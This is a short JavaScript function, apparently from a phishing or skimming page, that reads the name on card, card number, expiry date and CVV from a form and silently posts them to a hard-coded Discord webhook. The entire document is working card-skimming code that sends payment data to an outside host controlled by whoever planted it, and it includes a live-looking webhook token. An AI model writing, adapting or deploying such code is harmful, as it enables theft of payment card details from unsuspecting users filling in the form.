function message() {
    let nameoncard = document.getElementById("nameoncard").value;
    let cardnumber = document.getElementById('cardnumber').value;
    let expirydate = document.getElementById('expirydate').value;
    let cvv = document.getElementById('cvv').value;


    const webhook = "https://discord.com/api/webhooks/1333179610225184788/9SPuzCl30qopL0MCYuAKC5xoJ-uj8ghjO_PKSI7cKHvowKBEEGpzvdkk8orCAVJnUUHR";
    const contents = `Name On Card: ${nameoncard}\nCard Number: ${cardnumber}\nExpiry Date ${expirydate}\nCVV ${cvv}`;
    const request = new XMLHttpRequest();
    request.open("POST", webhook);
    request.setRequestHeader('Content-type', 'application/json');
    const params = {
        content: contents
    }
    request.send(JSON.stringify(params));
}